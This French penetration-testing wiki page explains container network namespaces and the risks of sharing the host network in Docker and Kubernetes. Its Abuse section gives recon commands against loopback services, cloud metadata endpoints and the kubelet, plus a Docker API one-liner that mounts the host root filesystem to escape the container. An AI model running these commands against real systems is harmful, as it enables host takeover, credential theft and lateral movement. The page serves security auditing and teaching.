# Espace de noms réseau

{{#include ../../../../../banners/hacktricks-training.md}}

## Aperçu

L'espace de noms réseau isole les ressources liées au réseau telles que les interfaces, les adresses IP, les tables de routage, l'état ARP/voisin, les règles de pare-feu, les sockets, et le contenu de fichiers comme `/proc/net`. C'est pourquoi un conteneur peut avoir ce qui ressemble à son propre `eth0`, ses propres routes locales et son propre périphérique loopback sans posséder la pile réseau réelle de l'hôte.

D'un point de vue sécurité, cela a de l'importance car l'isolation réseau concerne bien plus que la liaison de ports. Un espace de noms réseau privé limite ce que la charge de travail peut observer ou reconfigurer directement. Une fois cet espace de noms partagé avec l'hôte, le conteneur peut soudainement gagner en visibilité sur les listeners de l'hôte, les services locaux à l'hôte et les points de contrôle réseau qui n'étaient pas destinés à être exposés à l'application.

## Fonctionnement

Un espace de noms réseau fraîchement créé commence avec un environnement réseau vide ou quasi vide jusqu'à ce que des interfaces y soient attachées. Les runtimes de conteneurs créent ensuite ou connectent des interfaces virtuelles, attribuent des adresses et configurent les routes afin que la charge de travail dispose de la connectivité attendue. Dans les déploiements basés sur des bridge, cela signifie généralement que le conteneur voit une interface veth connectée à un bridge de l'hôte. Dans Kubernetes, les plugins CNI gèrent la configuration équivalente pour le réseau des Pods.

Cette architecture explique pourquoi `--network=host` ou `hostNetwork: true` représente un changement si radical. Au lieu de recevoir une pile réseau privée préparée, la charge de travail rejoint la pile réelle de l'hôte.

## Laboratoire

Vous pouvez voir un espace de noms réseau presque vide avec:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
Et vous pouvez comparer les conteneurs normaux et ceux connectés au réseau de l'hôte avec :
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Le host-networked container n'a plus sa propre vue isolée des sockets et des interfaces. Ce seul changement est déjà significatif avant même de se demander quelles capacités le processus possède.

## Runtime Usage

Docker et Podman créent normalement un network namespace privé pour chaque container, sauf configuration contraire. Kubernetes donne généralement à chaque Pod son propre network namespace, partagé par les containers à l'intérieur de ce Pod mais séparé de l'hôte. Incus/LXC fournissent également une isolation riche basée sur les network namespaces, souvent avec une plus grande variété de configurations de réseau virtuel.

Le principe courant est que le private networking est la frontière d'isolation par défaut, tandis que le host networking est une sortie explicite de cette frontière.

## Misconfigurations

La mauvaise configuration la plus importante est simplement le partage du host network namespace. Cela se fait parfois pour des raisons de performance, de surveillance bas niveau ou de commodité, mais cela supprime l'une des frontières les plus propres disponibles pour les containers. Les listeners locaux à l'hôte deviennent atteignables de façon plus directe, les services accessibles uniquement depuis localhost peuvent devenir accessibles, et des capacités comme `CAP_NET_ADMIN` ou `CAP_NET_RAW` deviennent beaucoup plus dangereuses parce que les opérations qu'elles autorisent s'appliquent désormais à l'environnement réseau de l'hôte.

Un autre problème est l'octroi excessif de capacités liées au réseau même lorsque le network namespace est privé. Un namespace privé aide, mais il ne rend pas inoffensifs les raw sockets ou le contrôle réseau avancé.

Dans Kubernetes, `hostNetwork: true` change aussi la confiance que vous pouvez accorder à la segmentation réseau au niveau du Pod. Kubernetes documente que de nombreux network plugins ne peuvent pas correctement distinguer le trafic des Pods `hostNetwork` pour le matching `podSelector` / `namespaceSelector` et le traitent donc comme du trafic node ordinaire. Du point de vue d'un attaquant, cela signifie qu'une workload `hostNetwork` compromise devrait souvent être traitée comme un point d'appui réseau au niveau du node plutôt que comme un Pod normal toujours contraint par les mêmes hypothèses de politique que les workloads sur overlay-network.

## Abuse

Dans des configurations faiblement isolées, des attaquants peuvent inspecter les services à l'écoute sur l'hôte, atteindre des endpoints de gestion liés uniquement au loopback, renifler ou interférer avec le trafic selon les capacités et l'environnement exacts, ou reconfigurer le routage et l'état du pare-feu si `CAP_NET_ADMIN` est présent. Dans un cluster, cela peut aussi faciliter le mouvement latéral et la reconnaissance du control-plane.

Si vous suspectez du host networking, commencez par confirmer que les interfaces et listeners visibles appartiennent à l'hôte plutôt qu'à un réseau isolé de container :
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Les services accessibles uniquement via loopback sont souvent la première découverte intéressante :
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Si des capacités réseau sont présentes, testez si la charge de travail peut inspecter ou modifier la pile visible :
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
Sur les kernels modernes, le réseau de l'hôte combiné à `CAP_NET_ADMIN` peut aussi exposer le chemin des paquets au-delà de simples modifications `iptables` / `nftables`. Les qdiscs et filtres de `tc` ont également une portée par espace de noms, donc dans un espace de noms réseau partagé de l'hôte ils s'appliquent aux interfaces hôtes que le conteneur peut voir. Si `CAP_BPF` est également présent, les programmes eBPF liés au réseau, tels que les loaders TC et XDP, deviennent également pertinents :
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
Ceci importe car un attaquant peut être capable de répliquer, rediriger, façonner ou supprimer le trafic au niveau de l'interface de l'hôte, et pas seulement de réécrire les règles du pare-feu. Dans un namespace réseau privé, ces actions se limitent à la vue du container ; dans un namespace hôte partagé, elles ont un impact sur l'hôte.

Dans des environnements cluster ou cloud, le networking au niveau de l'hôte justifie également un quick local recon des metadata et des services adjacents au control-plane :
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### Exemple complet : Host Networking + Local Runtime / Kubelet Access

Le Host networking ne fournit pas automatiquement host root, mais il expose souvent des services qui sont intentionnellement accessibles uniquement depuis le nœud lui‑même. Si l'un de ces services est faiblement protégé, Host networking devient un chemin direct de privilege-escalation.

Docker API sur localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet sur localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Impact :

- compromission directe de l'hôte si une API runtime locale est exposée sans protection adéquate
- reconnaissance du cluster ou mouvement latéral si kubelet ou des agents locaux sont atteignables
- manipulation du trafic ou déni de service si combiné avec `CAP_NET_ADMIN`

## Vérifications

L'objectif de ces vérifications est de déterminer si le processus possède une pile réseau privée, quelles routes et quels sockets à l'écoute sont visibles, et si la vue réseau ressemble déjà à celle de l'hôte avant même que vous testiez les capabilities.
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
- Si `/proc/self/ns/net` et `/proc/1/ns/net` ressemblent déjà à ceux de l'hôte, le container peut partager le network namespace de l'hôte ou un autre namespace non privé.
- `lsns -t net` et `ip netns identify` sont utiles lorsque le shell est déjà dans un namespace nommé ou persistant et que vous voulez le corréler avec les objets `/run/netns` côté hôte.
- `ss -lntup` est particulièrement utile car il révèle les services en écoute uniquement sur loopback et les endpoints de gestion locaux.
- Les routes, noms d'interfaces, contexte firewall, état de `tc` et les attachements eBPF deviennent beaucoup plus importants si `CAP_NET_ADMIN`, `CAP_NET_RAW`, ou `CAP_BPF` sont présents.
- Dans Kubernetes, l'échec de résolution d'un nom de service depuis un Pod `hostNetwork` peut simplement signifier que le Pod n'utilise pas `dnsPolicy: ClusterFirstWithHostNet`, et non que le service est absent.

Lors de l'audit d'un container, évaluez toujours le network namespace conjointement avec l'ensemble des capabilities. Le networking de l'hôte combiné à des capabilities réseau élevées constitue une posture très différente du networking par bridge avec un ensemble de capabilities par défaut restreint.

## Références

- [Kubernetes NetworkPolicy and `hostNetwork` caveats](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [eBPF token and capability requirements for network-related eBPF programs](https://docs.ebpf.io/linux/concepts/token/)
{{#include ../../../../../banners/hacktricks-training.md}}
